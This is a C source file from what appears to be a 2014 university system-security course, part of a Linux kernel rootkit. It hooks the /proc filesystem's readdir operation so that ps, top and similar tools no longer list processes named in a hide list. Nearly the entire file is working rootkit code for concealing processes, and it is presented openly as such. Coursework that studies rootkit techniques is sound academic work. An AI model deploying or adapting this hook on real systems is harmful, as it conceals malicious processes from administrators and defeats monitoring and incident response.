/**********************************************************
	Last Updated: Nov 18, 2014
	CSE509 System Security 2014 Fall @CS SBU
	Written By: 
		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
		Yaohui Chen (yaohchen@cs.stonybrook.edu)

	Description: 
		Hook the virtual file systems readdir func of the /proc fs, which ps, top user functions 
		will use to get proc information
***********************************************************/

#include "../headers/all.h"
#include "../headers/HJ_proc.h"


/*To hide the procs, one way is to hook the vfs call of the mounted /proc file */
/*
 *
 *
 *http://lxr.free-electrons.com/source/include/linux/proc_fs.h?v=3.2#L51   for struct page_dir_entry
 *
 */
static struct proc_dir_entry *hide_HJ_dummy, *HJ_target;
struct file_operations *fops_ptr;
static filldir_t original_filldir;
static int  (*original_proc_readdir)(struct file *, void *, filldir_t);


static int 
my_filldir(void *buf, char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){

	printk("%s\n", proc_name);

// hide the processes
	unsigned int i = 0;
	char *str = hide_proc[i++];
	while(str){
		if(!strcmp(proc_name, str)){
			printk("haha\n");
			return 0;
		}
		str = hide_proc[i++];
	}
	return original_filldir(buf, proc_name, len, off, ino, d_type);	

}

static int 
my_proc_readdir(struct file* filep, void *dirent, filldir_t filldir){

	original_filldir = filldir;
	return original_proc_readdir(filep, dirent, my_filldir);

}

bool 
init_HJ_proc(){

	hide_HJ_dummy = create_proc_entry("dummy", 0777, NULL);
	HJ_target = hide_HJ_dummy->parent;
	fops_ptr = ((struct file_operations *)HJ_target->proc_fops);
	original_proc_readdir = fops_ptr->readdir;
	fops_ptr->readdir = my_proc_readdir;
	return true;
}

bool 
rm_HJ_proc(){

	remove_proc_entry("dummy", NULL);
	fops_ptr->readdir = original_proc_readdir;
	return true;

}






/**/
